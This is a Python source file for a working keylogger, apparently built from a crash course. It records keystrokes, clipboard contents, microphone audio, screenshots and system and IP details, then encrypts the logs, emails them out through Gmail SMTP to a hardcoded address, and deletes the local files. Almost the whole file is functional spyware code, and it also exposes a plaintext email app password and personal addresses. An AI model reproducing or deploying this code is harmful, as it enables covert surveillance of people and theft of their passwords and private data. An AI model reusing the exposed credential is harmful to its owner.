# advanced_keylogger.py

import smtplib
import socket
import platform
import pyperclip
import time
import os
#import getpass
import sounddevice as sd
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
import mss      #for screenshots
from pynput.keyboard import Key, Listener

# === File Names and Paths ===
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

file_path = r"C:\Users\dell\Desktop\Python\python-advanced-keylogger-crash-course-master\Keylogger"  # Ensure this folder exists or use absolute path
extend = "\\"
file_merge = file_path + extend

if not os.path.exists(file_path):
    os.makedirs(file_path)

# === Timers and Counters ===
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
number_of_iterations = 0

# === Email Configuration ===
email_address = "yashasvi139sh@gmail.com"  # Replace with sender
password = "zydb qbqy lruq drt"     # App password if using Gmail
toaddr = "yashasvi2562.be22@chitkara.edu.in"     # Receiver email

# === Encryption Key ===
# Generate a key and write it to a file
key = Fernet.generate_key()
with open("encryption_key.key", "wb") as key_file:
    key_file.write(key)

# Read the key back from the file
with open("encryption_key.key", "rb") as key_file:
    key = key_file.read()



# === Function Definitions ===

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Log File Attached"
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment, 'rb') as file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        s.send_message(msg)
        s.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")


def computer_information():
    with open(file_merge + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except:
            f.write("Could not get Public IP Address\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            pasted_data = pyperclip.paste()
            f.write("Clipboard Data:\n" + pasted_data + "\n")
        except Exception as e:
            f.write("Clipboard could not be copied\n")


def microphone():
    fs = 44100
    seconds = microphone_time
    try:
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_merge + audio_information, fs, myrecording)
    except Exception as e:
        print(f"Microphone error: {e}")


def screenshot():
    try:
        with mss.mss() as sct:
            sct.shot(output=file_merge + screenshot_information)
    except Exception as e:
        print(f"Screenshot error: {e}")


def write_file(keys):
    with open(file_merge + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


# === Run Computer Info and Clipboard Collection First ===
computer_information()
copy_clipboard()
microphone()
screenshot()
send_email(screenshot_information, file_merge + screenshot_information, toaddr)

# === Keylogger Loop ===
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def on_release(key):
        if key == Key.esc or currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        screenshot()
        send_email(screenshot_information, file_merge + screenshot_information, toaddr)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

 

# === Encrypt Files ===
files_to_encrypt = [
    file_merge + system_information,
    file_merge + clipboard_information,
    file_merge + keys_information
]
encrypted_file_names = [
    file_merge + system_information_e,
    file_merge + clipboard_information_e,
    file_merge + keys_information_e
]

for i in range(len(files_to_encrypt)):
    try:
        with open(files_to_encrypt[i], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[i], 'wb') as f:
            f.write(encrypted)

        send_email(os.path.basename(encrypted_file_names[i]), encrypted_file_names[i], toaddr)
    except Exception as e:
        print(f"Encryption error: {e}")

# === Clean up Files ===
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    try:
        os.remove(file_merge + file)
    except Exception as e:
        print(f"Error deleting file {file}: {e}")
